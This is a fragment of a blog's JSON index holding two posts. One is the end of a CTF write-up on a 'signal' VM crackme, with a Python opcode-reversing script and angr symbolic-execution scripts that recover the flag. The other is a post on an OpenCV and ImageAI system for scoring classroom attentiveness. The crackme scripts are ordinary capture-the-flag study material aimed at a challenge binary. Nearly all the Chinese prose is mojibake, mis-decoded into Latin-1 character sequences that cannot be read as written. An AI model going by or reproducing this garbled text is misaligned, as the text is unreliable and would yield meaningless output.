Xuå°å§å§](https://hanxu-ideits.gitee.io/hanxuerr/)çš„è„šæœ¬,æ¯”èµ›æ—¶å°±è§£å‡ºæ¥æ˜¯çœŸçš„å¼ºï¼Œ\n\n```python\nv1=[0xa,4,0x10,8,3,5,1,4,0x20,8,5,3,1,3,2,8,0xb,\n            1,0xc,8,4,4,1,5,3,8,3,0x21,1,0xb,0x8,0xb,1,4,9,8,3,\n            0x20,1,2,0x51,8,4,0x24,1,0xc,8,0xb,1,5,2,8,2,0x25,\n            1,2,0x36,8,4,0x41,1,2,0x20,8,5,1,5,3,8,2,0x25,\n            1,4,9,8,3,0x20,1,2,0x41,8,0xc,1,7,0x22,7,0x3f,7,\n            0x34,7,0x32,7,0x72,7,0x33,7,0x18,7,0xa7,\n            7,0x31,7,0xf1,7,0x28,7,0x84,\n            7,0xc1,7,0x1e,7,0x7a]\nprint(len(v1))   \nv4=[0]*15\nv3=[0]*15\nv7=0\nv9=15\nv6=14\nv4=[122, 30, 193, 132, 40, 241, 49, 167, 24, 51, 114, 50, 52, 63, 34]\nprint(len(v4))\nfor i in range(len(v1)-1,-1,-1):\n    if(v1[i]==1):\n        v5=v4[v7]\n        v7+=1\n        v9-=1\n    if(v1[i]==12):\n        v3[v9]=v5-1\n    if(v1[i]==11):\n        v3[v9]=v5+1\n    if(v1[i]==8):\n        v5=v3[v6]\n        v6-=1\n    if(v1[i]==2):\n        v3[v9]=v5-v1[i+1]\n    if(v1[i]==3):\n        v3[v9]=v5+v1[i+1]\n    if(v1[i]==4 ):\n        v3[v9]=v5^v1[i+1]\n    if(v1[i]==5):\n        v3[v9]=v5//v1[i+1]\n    else :\n        continue\nprint(v4)\nprint(v3)\nprint (\"\".join(chr(i) for i in v3))\n\n```\n\n**3.Angr**\n\nangrä¹Ÿå«ç¬¦å·æ‰§è¡Œæš´åŠ›ç ´è§£ï¼Œç”¨äºè§£CTFé¢˜ç›®ï¼Œemmmå®æˆ˜ä¸­åº”è¯¥ä½œç”¨ä¸å¤§\n\nè¿™ä¸€å—æ˜¯æˆ‘çš„çŸ¥è¯†ç›²åŒºï¼Œç›´æ¥è´´ä¸Š[å­¦ä¹ èµ„æº1](https://www.jianshu.com/p/5df6c4567a7d)ã€[å­¦ä¹ èµ„æº2](https://www.secpulse.com/archives/83197.html)ã€[å­¦ä¹ èµ„æº3](https://blog.csdn.net/whym1/article/details/78838026).......[å­¦ä¹ èµ„æºN](https://github.com/angr/angr)ï¼Œå…ˆè®°ä¸‹æ¥ï¼Œä»¥åæ…¢æ…¢çœ‹ï¼ˆå’•å’•å’•ï¼‰\n\nè´´ä¸Šå¤§ä½¬ä»¬çš„è„šæœ¬\n\n```python\nimport angr\n\np = angr.Project('./signal.exe')   #æŒ‡å®šangrè·‘çš„ç¨‹åº\nstate = p.factory.entry_state()    #æ–°å»ºä¸€ä¸ªSimStateçš„å¯¹è±¡ï¼Œå¾—åˆ°ä¸€ä¸ªåˆå§‹åŒ–åˆ°äºŒè¿›åˆ¶å…¥å£å‡½æ•°çš„SimStateå¯¹è±¡ã€‚\nsimgr = p.factory.simgr(state)   #åˆ›å»ºsimulation managerï¼Œangrçš„ä¸»è¦å…¥å£\n\nsimgr.explore(find=0x004017A5 ,avoid=0x004016E6)  #äº‰å–è·‘åˆ°è¾“å‡ºæˆåŠŸçš„åœ°å€ï¼Œé¿å…è·‘åˆ°è¾“å‡ºwrongçš„åœ°å€\nflag = simgr.found[0].posix.dumps(0)[:15]     #å¾—åˆ°flag\nprint(flag)\n\n--------------------------------------------------------------------------------\n#HanXuçš„è„šæœ¬\nimport angr\np = angr.Project('./signal.exe')\nstate = p.factory.entry_state()\nsm = p.factory.simulation_manager(state)\ndef good(state):\n    return b\"good\" in state.posix.dumps(1)\n\ndef bad(state):\n    return b\"what\" in state.posix.dumps(1)\nsm.explore(find = good, avoid = bad)\nif sm.found:\n    find_state = sm.found[0]\nflag = find_state.posix.dumps(0)\nprint(flag)\n\n```\n\nè¿è¡Œç»“æœï¼š\n\n![image-20200614160910068](https://i.loli.net/2020/06/14/AvlxX4KD5fezk9m.png)\n\n------\n\n## 0x04 å°ç»“\n\nè¿™å¯èƒ½æ˜¯æˆ‘èµ›åå¤ç°è¿‡çš„ç¬¬ä¸€é¢˜ï¼Œè¿˜æ˜¯æ—¶éš”äº†è¿™ä¹ˆä¹…ã€‚ã€‚ã€‚\n\nä¹‹å‰æ€»æ„Ÿè§‰è¦ä»åŸºç¡€å­¦èµ·ï¼Œä»å…¥é—¨é¢˜æ…¢æ…¢è¿›é˜¶ï¼Œåæ¥å‘ç°è¿›æ­¥é€Ÿåº¦å®åœ¨ç¼“æ…¢ï¼Œ\n\nå°ç»“åšä¸€ä¸‹ç®€å•çš„åæ€\n\nå»ç¿»ä¸€ä¸‹[ç‚œå“¥](https://ljzjsc.com/)çš„åšå®¢ï¼Œå‘ç°ä»–æ¯æ¬¡èµ›åéƒ½ä¼šå†™ä¸€ç¯‡åšå®¢å¤ç°ä¸€ä¸‹å½“æ—¶æ²¡è§£å‡ºæ¥çš„é¢˜ç›®ï¼Œ\n\næˆ‘ä»¬è‹±è¯­è¯¾ç»å¸¸ä¼šè®¨è®ºä¸€äº›é€†å‘çš„è¯é¢˜ï¼Œä»–è¯´å¿…é¡»è¦é€¼ç€è‡ªå·±åšä¸€äº›éš¾é¢˜ï¼Œå¤§å®¶ä¸€å¼€å§‹éƒ½ä¸ä¼šï¼Œå°±æ˜¯é€šè¿‡æ¯ä¸€æ¬¡å¤ç°é¢˜ç›®æ¥å¼ºåˆ¶è‡ªå·±å­¦ä¹ æ–°çš„çŸ¥è¯†ï¼Œå¦åˆ™ä¼šä¸€ç›´åœç•™åœ¨å…¥é—¨æ°´å¹³ã€‚\n\næˆ‘ç›®å‰çš„çŠ¶æ€ç¡®å®ä¸åƒæƒ³å­¦ä¹ çš„æ€åº¦ï¼Œæ¯”å¦‚è¯´æ¯”èµ›é¢˜ç›®åªè¦æ²¡è§è¿‡ã€æˆ–è€…å¾ˆå¤æ‚ï¼Œæˆ‘å¾ˆéš¾é™ä¸‹å¿ƒæ¥è§£é¢˜ï¼Œä¸€èˆ¬è¿™ç§æƒ…å†µæˆ‘ä¼šç›´æ¥å…³æ‰ç½‘é¡µï¼Œç„¶åå®‰æ…°è‡ªå·±ï¼Œå—¯...è¿™é¢˜ä¸æ˜¯ç»™æˆ‘åšçš„ã€‚\n\né€†å‘å¤§ä½¬[å­æ´‹](http://iyzyi.com/)ã€ç‚œå“¥é‡åˆ°å·¨éš¾çš„é¢˜ç›®ä¼šæ…¢æ…¢åœ°å•ƒï¼Œå°±ç®—ä¸€é“é¢˜ç›®èŠ±è´¹å‡ å¤©çš„æ—¶é—´ï¼ŒçœŸæ­£ææ‡‚åŸç†å’Œé€»è¾‘ä¹Ÿæ˜¯å€¼å¾—çš„ï¼Œè¯´å®è¯ï¼Œè¿™é“signalé¢˜éš¾åº¦è¿œä¸åŠä»–ä»¬çš„åšå®¢çš„å¹³å‡æ°´å¹³ï¼Œå¯ä»¥è¯´æ˜¯æœ€ç®€å•çš„è™šæ‹Ÿæœºé¢˜ç›®ï¼ˆç‚œå“¥æ¯”èµ›æ‰‹æ’•åŠä¸ªå°æ—¶è§£å†³ï¼‰ï¼Œè™½ç„¶èŠ±äº†å‡ ä¸ªå°æ—¶æ‰ææ‡‚ï¼Œä½†è¿˜æ˜¯å¾ˆæœ‰æˆå°±æ„Ÿçš„\n\nå¼ è€å¸ˆè¯´è¿‡æ¯”èµ›å’Œé¢˜ç›®éƒ½ä¸æ˜¯å…³é”®ï¼Œå…³é”®æ˜¯ä½ èƒ½ä»ä¸­å­¦åˆ°ä»€ä¹ˆï¼Œåˆ†æ¸…ä¸»æ¬¡ï¼Œæ˜ç¡®å­¦ä¹ è§„åˆ’æ‰æ˜¯å½“å‰æœ€é‡è¦çš„\n\nå¥½å¥½å­¦é€†å‘ï¼Œäº‰å–æ¯”èµ›ä¸å†åªæ˜¯å»çº ç»“MISC\n\n","tags":["CTF","vmre"],"categories":["REVERSE"]},{"title":"åŸºäºOpenCVçš„åŠ¨æ€è¯†åˆ«ç³»ç»Ÿâ€”â€”éšç¬”","url":"/2020/05/08/OpenCV/","content":"\n# å‰è¨€\n\nå¤§ä¸€ç”³æŠ¥çš„å¤§åˆ›é¡¹ç›®ï¼Œæ²¡åŠæ³•è‡ªå·±ç”³æŠ¥çš„é¡¹ç›®ï¼Œå“­ç€ä¹Ÿå¾—åšå®Œï¼Œæ€»çš„æ¥è¯´çœŸæ­£å¼€å§‹æå¾—æ—¶é—´å°±æ˜¯æœ€åä¸€ä¸ªæœˆ\n\nè¿™ç¯‡æ–‡ç« åªæ˜¯è®°å½•äº†æˆ‘åšé¡¹ç›®æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆï¼Œä¸è®¨è®ºå…·ä½“å®ç°å’Œæºç ã€‚\n\n## é¡¹ç›®ç®€ä»‹\n\nåŸºäºOpenCV-pythonå’Œpython3.6çš„è¯¾å ‚åŠ¨æ€è¯†åˆ«ç³»ç»Ÿï¼Œå¯è‡ªåŠ¨ä¼°ç®—æ•™å®¤äººæ•°ï¼Œè®¡ç®—è¯¾å ‚æŠ¬å¤´ç‡ï¼ˆå³ä¸“æ³¨åº¦ï¼‰ï¼Œå¹¶è¯„å®šä¸€èŠ‚è¯¾çš„è¯¾å ‚è´¨é‡ã€‚\n\n------\n\n### ä¸€. ä¸ºä»€ä¹ˆç”¨OpenCV-pythonè€ŒéOpenCV-C++ï¼š\n\n1. ä¸»è¦åŸå› æ˜¯å¯¹äºå…¥é—¨è€…æ¥è¯´å›°éš¾ï¼Œpythonç›¸æ¯”äºC++æ›´ç®€å•ï¼Œæ›´å®¹æ˜“ç†è§£ã€‚\n\n2. è–„å¼±çš„æ–‡æ¡£ ï¼šC++æ–‡æ¡£å¾ˆå°‘ä¼šè´´å‡ºä»£ç çš„ä¾‹å­ï¼Œä»¥è‡´äºç†è§£å˜å¾—æ›´åŠ å¾—å›°éš¾ã€‚å°½ç®¡è´´å‡ºçš„ä»£ç æœ‰ç”¨ï¼Œä½†æ˜¯å…¶ä¹Ÿå¹¶éå¾ˆå¥½åœ°è¢«è®°å½•åœ¨æ–‡æ¡£ä¸­ã€‚#é™„ä¸Š[OpenCVä¸­æ–‡æ–‡æ¡£](http://woshicver.com/)\n\n3. ä¸€ä¸ªè®¡ç®—æœºè§†è§‰å¼•æ“æ—¶å¸¸éœ€è¦å¤§é‡çš„æœºå™¨å­¦ä¹ ç¨‹åºã€‚ç„¶è€Œï¼Œç›¸æ¯”äº OpenCVï¼ˆPythonï¼‰ï¼ŒOpenCVï¼ˆC++ï¼‰åªå«æœ‰ä¸€ä¸ªå°å‹çš„æœºå™¨å­¦ä¹ ç®—æ³•å­é›†ã€‚\n\n4. pythonæœ‰äº† **OpenCV**ã€ **numpy** ã€ **scipy** ã€ **scikit-learn** ä»¥åŠ **matplotlib** ï¼Œåœ¨è®¡ç®—æœºè§†è§‰é¢†åŸŸå’Œæœºå™¨å­¦ä¹ é¢†åŸŸï¼Œæä¾›äº†ä¸€ä¸ªå­¦ä¹ å’Œå®éªŒçš„å¼ºå¤§ç¯å¢ƒã€‚\n\n  #5. å…¶å®æˆ‘ä¹Ÿå°è¯•è¿‡apiç«¯å£ï¼Œäº²æµ‹åˆ©ç”¨opencv-pythonå¯ä»¥å®ç°ã€‚\n\n\n\n### äºŒ. ä¸ºä½•åœ¨å®ç°ç»Ÿè®¡äººæ•°åŠŸèƒ½æ—¶ä¸ä½¿ç”¨OpenCVï¼š\n\n1. ç»Ÿè®¡äººæ•°æ—¶è§†é¢‘å¾ˆå¡é¡¿ã€‚\n\n2. opencvåªèƒ½è¯†åˆ«æ­£è„¸ï¼Œå½“ä½å¤´ã€ä¾§è„¸æ—¶æ— æ³•æ£€æµ‹ã€‚ï¼ˆåé¢å¼•è¿›ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·`ImageAI`ï¼‰\n\n3. ç®—æ³•ç›¸å¯¹åŸºç¡€ï¼Œå®é™…åº”ç”¨è¯¯å·®å¤§ã€‚ï¼ˆæµ‹è¯•æ—¶3ç±³ä»¥å¤–å¾ˆéš¾è¯†åˆ«ï¼Œè€Œimageai10ç±³å†…é—®é¢˜ä¸å¤§ï¼‰\n\n4. æœ¬äººå¯¹opencvç›¸å…³çŸ¥è¯†æŒæ¡ä¸åˆ°ä½ï¼Œåˆ©ç”¨å·¥å…·æ¯”è¾ƒæ–¹ä¾¿ã€‚\n\n\n\n### ä¸‰. ä»€ä¹ˆæ˜¯ImageAIï¼Ÿ\n\n  `ImageAI`æ˜¯ä¸€ä¸ªpythonåº“ï¼Œæ—¨åœ¨ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿä½¿ç”¨ç®€å•çš„å‡ è¡Œä»£ç æ„å»ºå…·æœ‰åŒ…å«æ·±åº¦å­¦ä¹ å’Œè®¡ç®—æœºè§†è§‰åŠŸèƒ½çš„åº”ç”¨ç¨‹åºå’Œç³»ç»Ÿã€‚ ImageAIæœ¬ç€ç®€æ´çš„åŸåˆ™ï¼Œæ”¯æŒæœ€å…ˆè¿›çš„æœºå™¨å­¦ä¹ ç®—æ³•ï¼Œç”¨äºå›¾åƒé¢„æµ‹ï¼Œè‡ªå®šä¹‰å›¾åƒé¢„æµ‹ï¼Œç‰©ä½“æ£€æµ‹ï¼Œè§†é¢‘æ£€æµ‹ï¼Œè§†é¢‘å¯¹è±¡è·Ÿè¸ªå’Œå›¾åƒé¢„æµ‹è®­ç»ƒã€‚ImageAIç›®å‰æ”¯æŒä½¿ç”¨åœ¨ImageNet-1000æ•°æ®é›†ä¸Šè®­ç»ƒçš„4ç§ä¸åŒæœºå™¨å­¦ä¹ ç®—æ³•è¿›è¡Œå›¾åƒé¢„æµ‹å’Œè®­ç»ƒã€‚ImageAIè¿˜æ”¯æŒä½¿ç”¨åœ¨COCOæ•°æ®é›†ä¸Šè®­ç»ƒçš„RetinaNetè¿›è¡Œå¯¹è±¡æ£€æµ‹ï¼Œè§†é¢‘æ£€æµ‹å’Œå¯¹è±¡è·Ÿè¸ªã€‚ æœ€ç»ˆï¼ŒImageAIå°†ä¸ºè®¡ç®—æœºè§†è§‰æä¾›æ›´å¹¿æ³›å’Œæ›´ä¸“ä¸šåŒ–çš„æ”¯æŒï¼ŒåŒ…æ‹¬ä½†ä¸é™äºç‰¹æ®Šç¯å¢ƒå’Œç‰¹æ®Šé¢†åŸŸçš„å›¾åƒè¯†åˆ«ã€‚\n\n#é™„ä¸Š[ImageAI ä¸­æ–‡æ–‡æ¡£](https://imageai-cn.readthedocs.io/zh_CN/latest/) , å¹¸è¿çš„æ˜¯ï¼ŒåŸºæœ¬ç”¨æ³•ä»‹ç»å¾ˆè¯¦å°½ï¼Œå¯ä»¥æ”¾å¿ƒå­¦ä¹ ã€‚\n\n\n\n### å››.ä¸ºä»€ä¹ˆç”¨ImageAIï¼Ÿ\n\nä¼˜ç‚¹ï¼šæ·±åº¦å­¦ä¹ åº“ï¼Œè®­ç»ƒæ¨¡å‹æ ·æœ¬å¤§ï¼Œä¸éœ€è¦è‡ªå·±è®­ç»ƒæ¨¡å‹ï¼Œç®—æ³•ç®€æ´ï¼ŒèŠ‚çº¦æ—¶é—´ç²¾åŠ›ï¼Œè¯†åˆ«ç²¾ç¡®åº¦ã€‚\n\nç¼ºç‚¹ï¼šå¯ä»¥åˆ†æè¾“å…¥çš„å›¾ç‰‡è§†é¢‘ï¼Œä½†æ— æ³•å®æ—¶æ£€æµ‹ç›‘æ§ä¸­ç”»é¢ã€‚\n\nï¼ˆè½¬æ¢æ€è·¯â€”â€”å›ºå®šé—´éš”æˆªå–ä¸€å¸§ç”»é¢ï¼Œå°†è§†é¢‘åˆ†æè½¬ä¸ºå¯¹å›¾ç‰‡çš„åˆ†æï¼Œå®ç°ç»Ÿè®¡äººæ•°çš„ä½œç”¨ï¼‰\n\n\n\n### äº”.å…·ä½“å®ç°æµç¨‹ï¼š\n\n1. è°ƒå‡ºç³»ç»Ÿæ‘„åƒå¤´\n\n2. é€šè¿‡Haarçº§è”å®æ—¶æ£€æµ‹äººè„¸ï¼ˆHaar çº§è”ä¸å…·æœ‰æ—‹è½¬ä¸å˜æ€§ï¼Œå³ä¸è®¤ä¸ºä¾§é¢ç…§ä¸æ­£é¢ç…§æ˜¯ç›¸åŒçš„ï¼‰\n\n3. ç»Ÿè®¡å‡ºæ­£è„¸äººæ•°ï¼ˆè§†ä¸ºä¸“å¿ƒå¬è®²äººæ•°ï¼‰\n\n4. å›ºå®šæ—¶é—´é—´éš”æˆªå–ä¸€å¸§ç”»é¢\n\n5. åˆ©ç”¨imageaiå¯¹å›¾ç‰‡è¿›è¡Œåˆ†æï¼Œç»Ÿè®¡å‡ºæ€»äººæ•°\n\n6. æ€»äººæ•°ä¸æ­£è„¸äººæ•°åšå·®ï¼Œè®¡ç®—å‡ºä½å¤´æˆ–è½¬å¤´çš„äººæ•°ï¼Œè§†æ­¤éƒ¨åˆ†äººæ•°å³ä¸ºå¬è®²ä¸ä¸“æ³¨äººæ•°\n\n7. è®¡ç®—ç­çº§æ•´ä½“ä¸“æ³¨åº¦ï¼Œè¯„ä»·è¯¾å ‚è´¨é‡\n\n\n\n### å…­.å…‹æœå›°éš¾åŠè®¾è®¡æ€è·¯ï¼š\n\n  é¦–å…ˆï¼Œé¢„æƒ³çš„å®æ—¶è§†é¢‘ä¸­åˆ†æä¸ç»Ÿè®¡äººæ•°çš„å®ç°ç›¸å¯¹å›°éš¾: æ­¤é¡¹ç›®è¦æ±‚ç²¾å‡†å¯¹ç›¸å¯¹è¾ƒé«˜ï¼Œåˆ©ç”¨**opencv** **Haarçº§è”**æ£€æµ‹äººè„¸ç²¾å‡†åº¦ä½ä¸”æµ‹è¯•è·ç¦»çŸ­ï¼Œä¸”è¿è¡Œåç”»é¢å¡é¡¿ï¼ˆä¸æ˜åŸå› ï¼‰ï¼Œå¾ˆéš¾ç¬¦åˆè¦æ±‚ã€‚\n\n  å› æ­¤å¯»æ‰¾åˆ°æ›´å¼ºå¤§çš„å·¥å…·â€”â€”**ImageAI**ï¼Œå®ƒå¯ä»¥è§£å†³äººä¸åŒå§¿åŠ¿çš„è¯†åˆ«é—®é¢˜ï¼Œä½†æ˜¯ç¼ºé™·æ˜¯ä¸èƒ½é€šè¿‡æ‘„åƒå¤´å¯¹ç”»é¢è¿›è¡Œå®æ—¶æ£€æµ‹ç‰©ä½“ï¼Œäºæ˜¯è½¬æ¢æ€è·¯ï¼Œé€šè¿‡æˆªå–ä¸€å¸§ç”»é¢ï¼Œå°†è§†é¢‘åˆ†æé—®é¢˜è½¬åŒ–ä¸ºå›¾ç‰‡åˆ†æé—®é¢˜ï¼Œè¿›è€Œå®ç°äººæ•°çš„ç»Ÿè®¡çš„åŠŸèƒ½ã€‚\n\n  ä¸Šè¯¾çš„ä¸“æ³¨ç¨‹åº¦é—®é¢˜å¤æ‚ï¼Œæˆ‘å°è¯•è¿‡é€šè¿‡**åˆ†æçœ¨çœ¼é¢‘ç‡**æ¥åˆ¤æ–­äººæ˜¯å¦å›°å€¦ï¼Œäº‹å®è¯æ˜å½“åªåˆ†æä¸€ä¸ªäººæ—¶åŠŸèƒ½æ­£å¸¸å®ç°ï¼ˆä¸”åªèƒ½åˆ†ææ­£è„¸ï¼‰ï¼Œä½†æ˜¯è¿™ç§ç®—æ³•æ— æ³•åšåˆ°å¤šäººå®æ—¶æ£€æµ‹ã€‚äºæ˜¯åå‘æ€ç»´ï¼Œå³ä¸åˆ†æç¡è§‰çš„åŒå­¦ï¼Œè€Œæ˜¯åˆ†æè®¤çœŸå¬è®²çš„åŒå­¦ï¼Œå¦‚æœèƒ½ç»Ÿè®¡å‡ºè¿™ä¸€éƒ¨åˆ†äººï¼Œåšå·®ä¾¿æ˜¯ä¸ä¸“å¿ƒçš„åŒå­¦äººæ•°ã€‚äºæ˜¯åˆ©ç”¨**Haarçº§è”ç²¾å‡†åº¦ä½**çš„ç‰¹ç‚¹ï¼Œæµ‹å‡ºæ­£è„¸äººæ•°ï¼Œå…¶ä½™ä¾¿æ˜¯ä¸ä¸“æ³¨å­¦ç”Ÿæ•°é‡ï¼ˆåŒ…æ‹¬ä½å¤´ã€è½¬å¤´æˆ–è½¬èº«ï¼‰ã€‚\n\n  è®¾å®šè¯¾å ‚è´¨é‡è¯„ä»·æ ‡å‡†ï¼Œä»¥ç­çº§**ä¸“æ³¨åº¦**ä¸ºæ ‡å‡†ï¼Œä¸“æ³¨åº¦>85%ï¼Œè¯¾å ‚è´¨é‡ä¸ºä¼˜ï¼›50%<ä¸“æ³¨åº¦<85%ï¼Œè¯¾å ‚è´¨é‡ä¸ºä¸­ï¼›ä¸“æ³¨åº¦<50%ï¼Œè¯¾å ‚è´¨é‡ä¸ºå·®ã€‚\n\n\n\n### ä¸ƒ.å­˜åœ¨çš„é—®é¢˜bugï¼š\n\n1. å¯¹äºå…‰çº¿è¦æ±‚æ¯”è¾ƒé«˜ï¼Œåœ¨æ˜æš—æ¡ä»¶ä¸‹ï¼ˆå¦‚é˜´å¤©ï¼‰æ•ˆæœä¸å¥½ã€‚\n\n2. æµ‹è¯•è·ç¦»ä¸è¶³ï¼Œå¯¹äºé¢ç§¯å¤§çš„æ•™å®¤æ•ˆæœæ¬ ä½³ã€‚\n\n3. å­¦ç”Ÿçš„çœ¼é•œæœ‰ä¸€å®šå¹²æ‰°ï¼Œå¸¦ä¸Šçœ¼é•œåè¯†åˆ«å‡†ç¡®åº¦ä¼šæœ‰æ‰€ä¸‹é™ã€‚\n\n4. äººæ•°å¤šè€Œå¯†é›†æ—¶ï¼Œç²¾å‡†åº¦ä¹Ÿä¼šå¤§å¤§é™ä½ã€‚\n\n### å…«.README.mdï¼š\n\næœ¬é¡¹ç›®åˆ©ç”¨ `OpenCV`ã€ `ImageAI` å’Œ `Python3` å®Œæˆï¼Œç»æµ‹è¯•é€‚ç”¨äºäººæ•°ä¸å¤šã€é‡‡å…‰è¾ƒå¥½çš„å°æ•™å®¤ã€‚\n\næ—¶é—´ä»“ä¿ƒï¼Œç¨‹åºç®€é™‹ï¼Œæµ‹è¯•ç»“æœç²—ç•¥ï¼Œä»…ä»¥å­¦ä¹ ä¸ºç›®çš„ï¼Œä»…ä¾›å‚è€ƒã€‚","tags":["OpenCV"],"categories":["DEVELOP"]}]